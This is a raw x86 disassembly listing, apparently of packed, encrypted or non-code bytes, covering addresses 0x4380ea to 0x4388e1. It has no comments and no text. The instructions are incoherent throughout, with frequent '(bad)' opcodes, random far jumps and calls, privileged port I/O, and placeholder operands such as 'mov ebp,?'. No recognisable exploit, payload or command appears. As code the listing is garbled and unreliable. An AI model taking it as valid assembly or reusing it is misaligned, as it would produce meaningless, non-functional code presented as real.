  4380ea:	ds jp  0x4380f5
  4380ed:	popa   
  4380ee:	call   0x2d8d:0x4faf23ca
  4380f5:	dec    ebx
  4380f6:	out    dx,al
  4380f7:	(bad)  
  4380f8:	aas    
  4380f9:	test   ch,ch
  4380fb:	das    
  4380fc:	dec    edi
  4380fd:	fwait
  4380fe:	push   esp
  4380ff:	mov    eax,ds:0x1c668f85
  438104:	cwde   
  438105:	addr16 xchg edx,eax
  438107:	jno    0x438167
  438109:	sti    
  43810a:	ret    0x4a0f
  43810d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43810e:	or     BYTE PTR [eax],0x3e
  438111:	fs push ecx
  438113:	mov    al,0xde
  438115:	adc    bl,dh
  438117:	push   0x1b45bd13
  43811c:	pop    esi
  43811d:	loop   0x438139
  43811f:	xor    eax,ebx
  438121:	je     0x43819d
  438123:	fisttp DWORD PTR [edx+0x45fe8160]
  438129:	sub    eax,0xdaa8d528
  43812e:	loopne 0x438100
  438130:	pop    esi
  438131:	loope  0x4380bf
  438133:	out    dx,al
  438134:	in     eax,dx
  438135:	mov    ah,0x39
  438137:	out    dx,eax
  438138:	mov    eax,ds:0xcb997860
  43813d:	jae    0x4381be
  43813f:	mov    bl,0xfc
  438141:	mov    cl,0xee
  438143:	retf   0x3709
  438146:	xchg   ecx,eax
  438147:	leave  
  438148:	inc    esp
  438149:	pcmpgtb mm4,QWORD PTR [ecx+0x724835b7]
  438150:	dec    ebp
  438151:	es int 0xfe
  438154:	outs   dx,BYTE PTR ds:[esi]
  438155:	xor    BYTE PTR [ebp+ecx*4+0x5e],cl
  438159:	jmp    0x4ae4:0xd4dee482
  438160:	sub    al,0x75
  438162:	or     eax,0x4e60ab07
  438167:	cmc    
  438168:	mov    edi,DWORD PTR [esi]
  43816a:	(bad)  
  43816c:	pop    esi
  43816d:	sbb    ch,ah
  43816f:	fs stos BYTE PTR es:[edi],al
  438171:	or     DWORD PTR [ebp+0x32],ecx
  438174:	sar    DWORD PTR [edi+eax*1-0x4742a65f],cl
  43817b:	inc    esi
  43817c:	ret    0x1b1c
  43817f:	icebp  
  438180:	pusha  
  438181:	xchg   edi,eax
  438182:	stc    
  438183:	or     eax,0xe0e89fbd
  438188:	out    dx,eax
  438189:	dec    eax
  43818a:	pop    ecx
  43818b:	mov    cs,WORD PTR [edi-0x3ac0fc1f]
  438191:	pop    edi
  438192:	jne    0x438199
  438194:	jmp    0xee9f:0x87758a1c
  43819b:	ffree  st(1)
  43819d:	xor    eax,0x3e45763
  4381a2:	adc    eax,0x79288ea1
  4381a7:	arpl   WORD PTR [esi],bx
  4381a9:	push   esi
  4381aa:	mov    WORD PTR [eax],fs
  4381ac:	mov    esi,0x5b6e689c
  4381b1:	mov    ds:0x90f37b73,eax
  4381b6:	ds pusha 
  4381b8:	pop    ds
  4381b9:	mov    ch,0xfb
  4381bb:	mov    al,ds:0x9e961890
  4381c0:	sbb    eax,0x36f2e403
  4381c5:	out    0xba,eax
  4381c7:	mov    eax,ds:0x23939851
  4381cc:	dec    ebp
  4381cd:	mov    ah,0x35
  4381cf:	push   edx
  4381d0:	xchg   edi,eax
  4381d1:	call   0x44e4832e
  4381d6:	scas   al,BYTE PTR es:[edi]
  4381d7:	mov    bl,0x20
  4381d9:	pop    esi
  4381da:	and    al,0xb2
  4381dc:	xchg   esi,eax
  4381dd:	cmp    esi,ebp
  4381df:	and    dl,BYTE PTR [edx+eiz*2+0x6d]
  4381e3:	mov    ecx,0xa16f16d8
  4381e8:	jne    0x438260
  4381ea:	inc    edi
  4381eb:	cli    
  4381ec:	or     al,0xae
  4381ee:	cmp    edi,DWORD PTR [ebp-0x66db94a2]
  4381f4:	out    dx,eax
  4381f5:	adc    bl,bh
  4381f7:	inc    ebp
  4381f8:	push   ebp
  4381f9:	popa   
  4381fa:	int3   
  4381fb:	add    al,0x40
  4381fd:	push   esi
  4381fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4381ff:	loop   0x43827e
  438201:	clc    
  438202:	out    dx,al
  438203:	cmc    
  438204:	sbb    BYTE PTR [ebx+0x6],0xba
  438208:	test   DWORD PTR [ebx],ecx
  43820a:	sbb    eax,0xedefcba8
  43820f:	or     al,0x7f
  438211:	imul   esi,DWORD PTR [ecx+eiz*1],0x4a87396a
  438218:	(bad)  
  438219:	in     al,0xaa
  43821b:	outs   dx,BYTE PTR ds:[esi]
  43821c:	adc    DWORD PTR [eax-0x77],ebp
  43821f:	mov    eax,ds:0xb36c8292
  438224:	sbb    ebx,eax
  438226:	scas   eax,DWORD PTR es:[edi]
  438227:	or     esp,DWORD PTR [ecx+esi*1+0x56]
  43822b:	pop    es
  43822c:	dec    ebp
  43822d:	add    DWORD PTR [edi+0x1af800],edx
  438233:	mov    eax,ds:0x97c92a08
  438238:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438239:	fsubr  DWORD PTR [esi+0x51]
  43823c:	pop    esi
  43823d:	fcmovnu st,st(1)
  43823f:	jbe    0x43829a
  438241:	out    0xb0,eax
  438243:	dec    ebp
  438244:	sub    esp,DWORD PTR [eax+0x69]
  438247:	dec    BYTE PTR [ecx-0x49]
  43824a:	cdq    
  43824b:	or     ch,0x30
  43824e:	xor    DWORD PTR [ecx+0x5e],ebp
  438251:	jge    0x438261
  438253:	dec    edx
  438254:	test   DWORD PTR [esi],ebp
  438256:	cld    
  438257:	and    eax,0x1fc66087
  43825c:	fisttp WORD PTR [edi+eiz*2]
  43825f:	mov    al,ch
  438261:	mul    BYTE PTR [edx+0x3c]
  438264:	pop    esi
  438265:	inc    edi
  438266:	sbb    al,0x47
  438268:	mov    DWORD PTR [edi-0x59],esi
  43826b:	push   ebx
  43826c:	fldcw  WORD PTR [esp+ebx*2]
  43826f:	mov    eax,ds:0xdb069740
  438274:	or     al,0x50
  438276:	sub    al,0xc7
  438278:	fs out 0x2d,al
  43827b:	sti    
  43827c:	lahf   
  43827d:	add    ch,ah
  43827f:	push   ecx
  438280:	mov    esp,0xc77526eb
  438285:	pusha  
  438286:	sbb    bl,ch
  438288:	mov    ds:0x8c159698,eax
  43828d:	ss lock mov al,cl
  438291:	push   cs
  438292:	push   edx
  438293:	shl    DWORD PTR [edx-0x20],0x7e
  438297:	hlt    
  438298:	or     eax,0x729d5a64
  43829d:	pusha  
  43829e:	add    ch,bh
  4382a0:	stc    
  4382a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4382a2:	cwde   
  4382a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4382a4:	dec    esi
  4382a5:	sub    dh,ch
  4382a7:	cmp    eax,DWORD PTR [ebx]
  4382a9:	in     al,dx
  4382aa:	stos   DWORD PTR es:[edi],eax
  4382ab:	and    ch,bh
  4382ad:	or     BYTE PTR [esi-0x369ee588],0x2
  4382b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4382b5:	in     eax,0xdd
  4382b7:	in     eax,dx
  4382b8:	(bad)  
  4382b9:	xor    ebp,esi
  4382bb:	lods   al,BYTE PTR ds:[esi]
  4382bc:	lock push cs
  4382be:	or     ebx,esi
  4382c0:	xor    eax,0x82a1778e
  4382c5:	add    eax,0x44a446c7
  4382ca:	clc    
  4382cb:	sbb    DWORD PTR [ebp-0x53],0xffffffdd
  4382cf:	sub    DWORD PTR gs:[esi],edx
  4382d2:	dec    esp
  4382d3:	and    ch,BYTE PTR [edx+0x74]
  4382d6:	fisub  WORD PTR [eax+0x6def1d46]
  4382dc:	push   es
  4382dd:	xor    DWORD PTR [ecx-0x4cffb388],0xffffffdf
  4382e4:	pop    esi
  4382e5:	or     ecx,DWORD PTR [esi+0xf6f1963]
  4382eb:	mov    eax,ds:0x2ce5db96
  4382f0:	inc    ecx
  4382f1:	jnp    0x438289
  4382f3:	jno    0x438352
  4382f5:	xchg   edx,eax
  4382f6:	mov    ecx,0xc5814ff1
  4382fb:	sbb    ch,ch
  4382fd:	jns    0x438335
  4382ff:	pop    esp
  438300:	mov    al,ds:0x6b157f60
  438305:	mov    bl,0x7b
  438307:	inc    ecx
  438308:	push   esp
  438309:	xchg   esi,ebp
  43830b:	push   edx
  43830c:	xchg   esi,eax
  43830d:	outs   dx,DWORD PTR ds:[esi]
  43830e:	adc    dl,dl
  438310:	sbb    DWORD PTR [edi+0x3beaa3f2],esi
  438316:	lds    edx,FWORD PTR [eax-0x7b]
  438319:	xchg   DWORD PTR [esi-0x75],eax
  43831c:	and    al,0xce
  43831e:	(bad)  
  438320:	pop    ebp
  438321:	lods   al,BYTE PTR ds:[esi]
  438322:	mov    ch,0x74
  438324:	sbb    edx,DWORD PTR [esi-0x36]
  438327:	leave  
  438328:	jp     0x43831d
  43832a:	mov    ebp,0x588ddaa0
  43832f:	sbb    bl,bl
  438331:	pop    esp
  438332:	cld    
  438333:	cdq    
  438334:	pop    esi
  438335:	or     ebx,DWORD PTR [ebp+0x45]
  438338:	pop    ss
  438339:	lods   al,BYTE PTR ds:[esi]
  43833a:	push   esp
  43833b:	adc    ebx,DWORD PTR [edx-0x2d0ccaa0]
  438341:	mov    ch,0xf8
  438343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  438344:	or     bh,BYTE PTR [ebx]
  438346:	(bad)  
  438347:	aad    0xb0
  438349:	push   0x70d0759d
  43834e:	ins    DWORD PTR es:[edi],dx
  43834f:	and    eax,0xa4582476
  438354:	cmp    BYTE PTR [ecx+0x5c5ee0e3],bl
  43835a:	mov    edx,DWORD PTR [esp+ebp*1+0x0]
  43835e:	ss push 0xee305a0f
  438364:	jg     0x438305
  438366:	add    DWORD PTR [ecx],esi
  438368:	adc    DWORD PTR [edx],ebx
  43836a:	inc    edx
  43836b:	push   edi
  43836c:	push   ebx
  43836d:	fsubrp st(0),st
  43836f:	jg     0x43838f
  438371:	call   0x386df0ba
  438376:	or     ah,BYTE PTR [ecx-0x8f8d1ee]
  43837c:	dec    esp
  43837d:	retf   0xb055
  438380:	pop    ebp
  438381:	adc    BYTE PTR [ebx],dl
  438383:	cdq    
  438384:	test   cl,bh
  438386:	retf   0x9eac
  438389:	mov    dh,0x71
  43838b:	mov    eax,ds:0x1d1d8cf0
  438390:	sti    
  438391:	and    eax,0x605e174d
  438396:	cwde   
  438397:	shl    DWORD PTR [eax],cl
  438399:	mov    al,0x5e
  43839b:	mov    edi,cs
  43839d:	pop    edi
  43839e:	pop    edx
  43839f:	mov    cl,0x2d
  4383a1:	sbb    DWORD PTR [esi+esi*4],esp
  4383a4:	fsub   QWORD PTR [ecx+eax*8-0x11390738]
  4383ab:	sbb    ebx,ecx
  4383ad:	mov    esp,0x7bf76d54
  4383b2:	fbld   TBYTE PTR [eax-0x12d9349d]
  4383b8:	mov    eax,0x540983d2
  4383bd:	mov    bh,BYTE PTR [ebp-0x65]
  4383c0:	fidivr WORD PTR [ebp+ebx*2-0x2b]
  4383c4:	lods   al,BYTE PTR ds:[esi]
  4383c5:	popf   
  4383c6:	imul   DWORD PTR [edi-0xe20a12d]
  4383cc:	add    BYTE PTR [ecx-0x17],ah
  4383cf:	shr    esp,cl
  4383d1:	inc    ebx
  4383d2:	dec    ecx
  4383d3:	mov    ebx,0xee946e
  4383d8:	xor    cl,cl
  4383da:	test   DWORD PTR [ecx-0x3d],eax
  4383dd:	ss cmc 
  4383df:	inc    ecx
  4383e0:	fmul   QWORD PTR [edx+0x65]
  4383e3:	jecxz  0x43844f
  4383e5:	sbb    ebp,eax
  4383e7:	mov    al,ds:0x535d0c59
  4383ec:	jecxz  0x4383b8
  4383ee:	sbb    bl,BYTE PTR [edx+0x5e]
  4383f1:	cmp    DWORD PTR [edx+0x62369a30],ecx
  4383f7:	ss cmp eax,0xe0f88761
  4383fd:	out    0x9c,al
  4383ff:	xchg   edx,eax
  438400:	sub    eax,0x5af2ee6b
  438405:	cmp    bl,BYTE PTR [ebp-0x59]
  438408:	icebp  
  438409:	mov    DWORD PTR [ebp+0x311810a0],edi
  43840f:	out    0xed,eax
  438411:	adc    eax,0xf35eae1c
  438416:	or     eax,DWORD PTR [ecx+0x21]
  438419:	and    ah,BYTE PTR [esi]
  43841b:	jecxz  0x4383d9
  43841d:	pusha  
  43841e:	jb     0x4383ad
  438420:	or     al,0x9a
  438422:	push   ebp
  438423:	cmp    BYTE PTR [edx+0x4119ee4b],dl
  438429:	and    DWORD PTR [edx+0x24],0xa0cc2962
  438430:	sub    ecx,DWORD PTR [eax-0x33e0ba68]
  438436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438437:	push   ds
  438438:	push   ebx
  438439:	inc    ebx
  43843a:	and    esi,DWORD PTR [eax+0x2890899e]
  438440:	jecxz  0x4383e2
  438442:	mov    ecx,0x6e2d59a8
  438447:	pop    ds
  438448:	push   edx
  438449:	test   BYTE PTR [eax-0x1105eb29],cl
  43844f:	scas   eax,DWORD PTR es:[edi]
  438450:	imul   esi,DWORD PTR [esi+0x1a],0x3738431b
  438457:	mov    eax,ds:0x6164b877
  43845c:	sar    DWORD PTR ds:0x125e3876,0xff
  438463:	dec    ebp
  438464:	fs mov bl,0x8b
  438467:	mov    bh,0x81
  438469:	pusha  
  43846a:	or     al,0x9a
  43846c:	popa   
  43846d:	stos   BYTE PTR es:[edi],al
  43846e:	pushf  
  43846f:	lds    ebp,FWORD PTR [esi]
  438471:	bound  ebx,QWORD PTR [eax+0x23]
  438474:	pop    esi
  438475:	mov    ds:0xe2b56a5f,eax
  43847a:	jmp    0xb3889a91
  43847f:	xor    eax,DWORD PTR [edx]
  438481:	mov    eax,ds:0x3283e7f5
  438486:	adc    esp,esi
  438488:	push   ecx
  438489:	addr16 aaa 
  43848b:	lock push esp
  43848d:	mov    edi,0x325d9dee
  438492:	pop    ds
  438493:	mov    al,ds:0x43e0533e
  438498:	push   esi
  438499:	inc    edx
  43849a:	test   eax,0xc6a14f8a
  43849f:	jle    0x43851f
  4384a1:	cmp    eax,0x916f3f02
  4384a6:	outs   dx,BYTE PTR ds:[esi]
  4384a7:	and    al,0x48
  4384a9:	stc    
  4384aa:	cmp    eax,0x3a614e6e
  4384af:	sub    BYTE PTR [edx-0x7],dh
  4384b2:	push   ecx
  4384b3:	xor    eax,0x6fee8e02
  4384b8:	fdivr  st(5),st
  4384ba:	stc    
  4384bb:	neg    BYTE PTR [ebx-0x305b5977]
  4384c1:	xor    eax,0x13cdeade
  4384c6:	jle    0x438480
  4384c8:	xchg   edx,eax
  4384c9:	add    esi,ebp
  4384cb:	cmc    
  4384cc:	xchg   ebp,eax
  4384cd:	stc    
  4384ce:	fwait
  4384cf:	int    0x1c
  4384d1:	xchg   DWORD PTR [ecx+0x38d67aa1],ecx
  4384d7:	cli    
  4384d8:	jecxz  0x438509
  4384da:	mov    eax,0x80925e52
  4384df:	xor    eax,0x69e657cc
  4384e4:	mov    cx,0xa159
  4384e8:	ins    DWORD PTR es:[edi],dx
  4384e9:	mov    ebp,?
  4384eb:	and    dl,al
  4384ed:	mov    al,0x7b
  4384ef:	pop    ebp
  4384f0:	push   ecx
  4384f1:	and    BYTE PTR ds:0xfe9ade7b,0xbc
  4384f8:	sbb    al,0x4f
  4384fa:	mov    bh,0xa2
  4384fc:	inc    edi
  4384fd:	rcr    edi,1
  4384ff:	add    DWORD PTR [eax],edi
  438501:	mov    ebx,0x1f5f752e
  438506:	out    dx,al
  438507:	sub    edx,DWORD PTR [edi]
  438509:	dec    esp
  43850a:	imul   edx,DWORD PTR [eax-0x584c83d3],0x739b9668
  438514:	mov    ?,eax
  438516:	pop    edi
  438517:	and    eax,0xf5069eff
  43851c:	jl     0x438571
  43851e:	test   al,0x4d
  438520:	icebp  
  438521:	inc    edx
  438522:	mov    eax,ds:0x213a8803
  438527:	mov    eax,ds:0x2100232b
  43852c:	(bad)  [edi-0x3d]
  43852f:	mov    esi,DWORD PTR [esi-0x4651122]
  438535:	aad    0x2d
  438537:	rcl    DWORD PTR [edx+0x482fe736],1
  43853d:	in     al,0xcf
  43853f:	xchg   ecx,eax
  438540:	push   ds
  438541:	or     ecx,edi
  438543:	mov    bh,0x6d
  438545:	stos   DWORD PTR es:[edi],eax
  438546:	pop    ecx
  438547:	add    al,0x3e
  438549:	(bad)  
  43854a:	shl    DWORD PTR [eax+0xdf36f0f],cl
  438550:	push   0x67f44310
  438555:	imul   ecx,edi,0x1260ab75
  43855b:	push   es
  43855c:	sbb    edx,eax
  43855e:	cli    
  43855f:	mov    al,ds:0xa4aa6424
  438564:	inc    eax
  438565:	into   
  438566:	call   0xfa54:0xb8865f2a
  43856d:	mov    bh,0xa4
  43856f:	jns    0x438506
  438571:	inc    ecx
  438572:	loop   0x4385ea
  438574:	imul   ebx,DWORD PTR [ebp+0x65],0xffffffb9
  438578:	jge    0x4385e3
  43857a:	add    ecx,DWORD PTR [eax]
  43857c:	into   
  43857d:	or     ch,ch
  43857f:	stc    
  438580:	pop    esi
  438581:	mov    al,ds:0xcd721dcf
  438586:	icebp  
  438587:	push   0xffffffc9
  438589:	pusha  
  43858a:	arpl   WORD PTR [eax+0x77d41bd7],cx
  438590:	repnz pop ebp
  438592:	out    dx,eax
  438593:	or     al,0x1c
  438595:	cmp    eax,0x7bcb80c7
  43859a:	cmp    esi,DWORD PTR [eax+ebp*2]
  43859d:	popa   
  43859e:	add    al,0x84
  4385a0:	or     bh,al
  4385a2:	test   edx,0xd34a5dc9
  4385a8:	pop    esi
  4385a9:	es jge 0x438558
  4385ac:	lea    esi,[edi-0x73]
  4385af:	mov    edi,0x62bb60ba
  4385b4:	cmp    ah,BYTE PTR [esi-0x13def43]
  4385ba:	out    dx,al
  4385bb:	test   DWORD PTR [edx+0x1becd6bd],ebp
  4385c1:	lea    ebx,[edx-0x5f]
  4385c4:	in     eax,0xf0
  4385c6:	mov    dh,0x47
  4385c8:	(bad)  
  4385c9:	xchg   esp,eax
  4385ca:	adc    ebp,DWORD PTR [ecx-0x7c408ca2]
  4385d0:	fincstp 
  4385d2:	lods   al,BYTE PTR ds:[esi]
  4385d3:	dec    BYTE PTR [edi]
  4385d5:	popa   
  4385d6:	pushf  
  4385d7:	fs test ch,bl
  4385da:	pop    esi
  4385db:	xchg   DWORD PTR [edi+0x141821b9],eax
  4385e1:	pop    esi
  4385e2:	test   ah,dh
  4385e4:	fidiv  WORD PTR [esi-0x27]
  4385e7:	sub    eax,0xc15c509e
  4385ec:	cli    
  4385ed:	pusha  
  4385ee:	fs and eax,0xa2a16d1a
  4385f4:	cmc    
  4385f5:	push   ecx
  4385f6:	in     al,dx
  4385f7:	jns    0x43858a
  4385f9:	jbe    0x43866e
  4385fb:	add    ebp,DWORD PTR [ecx-0x69b9b520]
  438601:	aas    
  438602:	xchg   ebx,eax
  438603:	jmp    0xb572:0xd0826131
  43860a:	inc    edx
  43860b:	xor    cl,cl
  43860d:	aam    0x4e
  43860f:	xchg   ebp,eax
  438610:	pop    ecx
  438611:	out    dx,al
  438612:	jo     0x438609
  438614:	lods   al,BYTE PTR ds:[esi]
  438615:	call   0x3d31:0x356ea767
  43861c:	jbe    0x438681
  43861e:	mov    ds:0xac5969d4,eax
  438623:	cmp    ebp,ebp
  438625:	aaa    
  438626:	pop    esi
  438627:	sub    DWORD PTR [edx+0x56],0xd5312591
  43862e:	out    0xad,al
  438630:	mov    dl,0xe0
  438632:	loope  0x4385d0
  438634:	cmp    eax,0x48472576
  438639:	inc    edx
  43863a:	mov    dh,0xe9
  43863c:	add    ecx,esp
  43863e:	icebp  
  43863f:	out    0x22,eax
  438641:	mov    eax,?
  438643:	pop    ds
  438644:	arpl   WORD PTR [edi],bp
  438646:	jns    0x43861c
  438648:	and    eax,0x87511f78
  43864e:	xlat   BYTE PTR ds:[ebx]
  43864f:	mov    eax,ds:0x2c750545
  438654:	nop
  438655:	les    esi,FWORD PTR [edx-0x14077b7c]
  43865b:	and    dh,BYTE PTR [edx]
  43865d:	fiadd  DWORD PTR [edi]
  43865f:	dec    ebp
  438660:	mov    ecx,0x7c82b9c8
  438665:	push   edi
  438666:	xor    al,0xc6
  438668:	lds    eax,FWORD PTR [edi]
  43866a:	out    0x89,eax
  43866c:	jp     0x4386c7
  43866e:	rcl    BYTE PTR [ebx-0x7e9002fb],0xd
  438675:	mov    cl,0xdf
  438677:	je     0x4386d7
  438679:	inc    ebx
  43867a:	adc    al,0xc5
  43867c:	push   0x7f3706ce
  438681:	push   edi
  438682:	cmc    
  438683:	ja     0x43861e
  438685:	xlat   BYTE PTR ds:[ebx]
  438686:	outs   dx,BYTE PTR ds:[esi]
  438687:	inc    ebp
  438688:	xchg   ecx,eax
  438689:	and    al,0x7
  43868b:	mov    edx,0x79f85d5e
  438690:	jno    0x43868e
  438692:	pop    ds
  438693:	push   esp
  438694:	dec    esi
  438695:	mov    ch,0xe8
  438697:	mov    eax,ds:0x77b630c6
  43869c:	int3   
  43869d:	pop    esi
  43869e:	outs   dx,DWORD PTR ds:[esi]
  43869f:	jo     0x438657
  4386a1:	mov    ds:0x275ee839,eax
  4386a6:	pop    ss
  4386a7:	push   ebx
  4386a8:	cmp    al,0x7a
  4386aa:	jo     0x43870c
  4386ac:	retf   0x6760
  4386af:	push   ecx
  4386b0:	jnp    0x438726
  4386b2:	adc    BYTE PTR [ebx],al
  4386b4:	pop    ebx
  4386b5:	retf   
  4386b6:	fisttp QWORD PTR [ecx+0x5e]
  4386b9:	ins    DWORD PTR es:[edi],dx
  4386ba:	loopne 0x43863d
  4386bc:	call   0x8460:0x41ca87f0
  4386c3:	ss aaa 
  4386c5:	test   al,0x53
  4386c7:	jecxz  0x43869e
  4386c9:	cwde   
  4386ca:	pop    eax
  4386cb:	pop    ss
  4386cc:	pop    esi
  4386cd:	int3   
  4386ce:	lods   eax,DWORD PTR ds:[esi]
  4386cf:	shl    BYTE PTR [eax-0x7e],0xdc
  4386d3:	adc    bl,dh
  4386d5:	pop    esi
  4386d6:	(bad)  
  4386d7:	jge    0x4386d4
  4386d9:	loope  0x438721
  4386db:	jg     0x4386fb
  4386dd:	mov    ebx,0xd75e52e2
  4386e2:	(bad)  
  4386e3:	jmp    0x607d:0xbd9c8fbc
  4386ea:	arpl   bp,si
  4386ec:	pop    ebx
  4386ed:	mov    eax,ds:0x58acef72
  4386f2:	out    dx,al
  4386f3:	out    dx,eax
  4386f4:	fcmovnbe st,st(6)
  4386f6:	mov    ds:0xb5c6624d,eax
  4386fb:	mov    al,ds:0xab5a282e
  438700:	fbstp  TBYTE PTR [ebx+ecx*2]
  438703:	or     eax,0xdeeb4a82
  438708:	in     al,dx
  438709:	push   edx
  43870a:	add    al,BYTE PTR [edx-0x16330f64]
  438710:	call   0xb71e7475
  438715:	sub    ebp,DWORD PTR [esi+0x62]
  438718:	sahf   
  438719:	js     0x43872d
  43871b:	cmc    
  43871c:	and    dl,BYTE PTR [edi]
  43871e:	jmp    0x438772
  438720:	push   0xffffffd0
  438722:	lahf   
  438723:	push   ecx
  438724:	inc    edx
  438725:	(bad)  
  438726:	sti    
  438727:	xor    ch,bh
  438729:	pusha  
  43872a:	xchg   eax,ecx
  43872c:	aad    0x9
  43872e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43872f:	mov    DWORD PTR ds:0xd4c5ec01,eax
  438735:	popf   
  438736:	jp     0x438792
  438738:	test   al,0xd9
  43873b:	add    al,0x26
  43873d:	and    bl,BYTE PTR [eax]
  43873f:	mov    eax,ds:0x5dccbdc2
  438744:	sar    DWORD PTR [eax-0x61],1
  438747:	call   0x7c647daa
  43874c:	shl    DWORD PTR ds:0x6073abbc,0x6e
  438753:	jns    0x438731
  438755:	ss sbb al,0xb8
  438758:	add    ebx,DWORD PTR [ebx]
  43875a:	out    dx,al
  43875b:	dec    ebx
  43875c:	test   al,0xf9
  43875e:	pop    esi
  43875f:	push   ebx
  438760:	cmp    ch,BYTE PTR [ecx-0x65fa60ad]
  438766:	stos   DWORD PTR es:[edi],eax
  438767:	mov    esp,0x55b61a1e
  43876c:	data16 icebp 
  43876e:	out    dx,al
  43876f:	dec    edi
  438770:	sbb    DWORD PTR [esi+0x70],edi
  438773:	ficomp DWORD PTR [ebp-0x17]
  438776:	dec    esp
  438777:	mov    eax,ds:0x195937a1
  43877c:	icebp  
  43877d:	jp     0x43873e
  43877f:	call   0x4b2ef8f4
  438784:	dec    ecx
  438785:	and    BYTE PTR [edx+0xeb14e8e],bl
  43878b:	and    ebp,edi
  43878d:	pusha  
  43878e:	mov    bl,0x2c
  438790:	std    
  438791:	aam    0xc8
  438793:	or     DWORD PTR [edx],ebx
  438795:	frstor [edx]
  438797:	mov    bl,0xc6
  438799:	pusha  
  43879a:	xchg   BYTE PTR [eax+0xade354b],ah
  4387a0:	test   al,0x60
  4387a2:	add    eax,0x789dc39a
  4387a7:	hlt    
  4387a8:	mov    ecx,0x1165ee74
  4387ad:	rcr    BYTE PTR [eax],cl
  4387af:	pop    esi
  4387b0:	imul   edx,DWORD PTR [ecx-0x3fa25831],0x75
  4387b7:	cld    
  4387b8:	xchg   ecx,eax
  4387b9:	loopne 0x4387d8
  4387bb:	lods   al,BYTE PTR ds:[esi]
  4387bc:	(bad)  
  4387bd:	pop    esp
  4387be:	lock in eax,dx
  4387c0:	add    BYTE PTR [ebp+0x3a],al
  4387c3:	sbb    DWORD PTR ds:0x76a46953,0xad444b60
  4387cd:	dec    esp
  4387ce:	in     eax,0xef
  4387d0:	xchg   esi,edx
  4387d2:	mov    cs,WORD PTR [ebx]
  4387d4:	bndldx (bad),[edx+edi*8]
  4387d8:	inc    edi
  4387d9:	loope  0x4387d9
  4387db:	aad    0xc6
  4387dd:	loop   0x438791
  4387df:	loop   0x4387db
  4387e1:	pusha  
  4387e2:	es xchg edx,eax
  4387e4:	jno    0x438821
  4387e6:	dec    eax
  4387e7:	jmp    0xffad:0x2aee743b
  4387ee:	sbb    al,0x3f
  4387f0:	addr16 cli 
  4387f2:	lods   al,BYTE PTR ds:[esi]
  4387f3:	sahf   
  4387f4:	(bad)  
  4387f5:	sbb    edi,DWORD PTR [esi-0xd]
  4387f8:	jle    0x438861
  4387fa:	sub    al,0x68
  4387fc:	fcomp  QWORD PTR ds:0x8721932e
  438802:	inc    edx
  438803:	fist   DWORD PTR [edx+0x61]
  438806:	xor    DWORD PTR [edi+0x57],ecx
  438809:	sub    eax,0xbac8239c
  43880e:	out    dx,al
  43880f:	pop    esp
  438810:	mov    esp,0xc257fb7d
  438815:	push   0x5f
  438817:	(bad)  [ebx]
  438819:	mov    ebp,esi
  43881b:	or     ecx,DWORD PTR [ebx+ebx*1+0x6ce78836]
  438822:	out    dx,al
  438823:	mov    ecx,DWORD PTR [edi+edi*8-0x2d]
  438827:	sbb    DWORD PTR [esi+eiz*8-0x5213acd],0x7
  43882f:	test   al,0xda
  438831:	push   ebx
  438832:	pop    ebx
  438833:	adc    DWORD PTR [ebx+0x1c],edx
  438836:	lods   al,BYTE PTR ds:[esi]
  438837:	out    dx,al
  438838:	pop    esi
  438839:	xor    bh,BYTE PTR [ebp-0x64945e9]
  43883f:	push   ebp
  438840:	loopne 0x4388a2
  438842:	lahf   
  438843:	sbb    eax,0xa4abc712
  438848:	or     al,0x12
  43884a:	repz mov ecx,0x219ae26e
  438850:	adc    al,0x28
  438852:	and    al,0xd0
  438854:	adc    BYTE PTR [ecx+0x11],ah
  438857:	sub    dh,BYTE PTR [edx+0x19]
  43885a:	inc    edi
  43885b:	sub    esi,DWORD PTR fs:[eax]
  43885e:	out    0xc,eax
  438860:	iret   
  438861:	ins    BYTE PTR es:[edi],dx
  438862:	cmp    BYTE PTR [ebx],bl
  438864:	fisub  WORD PTR [ebp-0x69]
  438867:	enter  0x60a1,0x26
  43886b:	and    eax,0x70803b91
  438870:	mov    esp,0xcaeaee94
  438875:	clc    
  438876:	jne    0x438830
  438878:	push   0xffffffc5
  43887a:	xchg   esp,eax
  43887b:	mov    eax,ds:0x5c916fb5
  438880:	int    0xc1
  438882:	push   0x1e
  438884:	pop    ebp
  438885:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  438886:	(bad)  
  438887:	fmul   QWORD PTR [ecx-0x73]
  43888a:	push   ebx
  43888b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43888c:	xchg   esi,eax
  43888d:	call   DWORD PTR [edx+0x10655aa1]
  438893:	icebp  
  438894:	jnp    0x4388c5
  438896:	mov    ch,0x8a
  438898:	push   ecx
  438899:	scas   al,BYTE PTR es:[edi]
  43889a:	aam    0xde
  43889c:	pop    esi
  43889d:	add    eax,0xc4d9dda6
  4388a2:	popf   
  4388a3:	mov    eax,ds:0x92c9b111
  4388a8:	sub    esp,DWORD PTR [edi-0x3ea1c052]
  4388ae:	jge    0x4388b2
  4388b0:	aas    
  4388b1:	dec    ebp
  4388b2:	in     al,0xc5
  4388b4:	sbb    al,0x61
  4388b6:	mov    ch,0xf9
  4388b8:	dec    edi
  4388b9:	fstp   QWORD PTR [ecx-0x119b24aa]
  4388bf:	scas   eax,DWORD PTR es:[edi]
  4388c0:	scas   eax,DWORD PTR es:[edi]
  4388c1:	loope  0x438923
  4388c3:	in     al,0x88
  4388c5:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4388c7:	mov    eax,ds:0xae34e513
  4388cc:	mov    eax,0x5a6b2c44
  4388d1:	dec    ebp
  4388d2:	inc    edi
  4388d3:	cmp    al,0x79
  4388d5:	pop    esp
  4388d6:	outs   dx,BYTE PTR ds:[esi]
  4388d7:	xchg   BYTE PTR [edi],ah
  4388d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4388da:	cmp    eax,0x171a4ea1
  4388df:	mov    ch,0x9c
  4388e1:	fcomp  DWORD PTR [esi+ebp*8+0x5e]
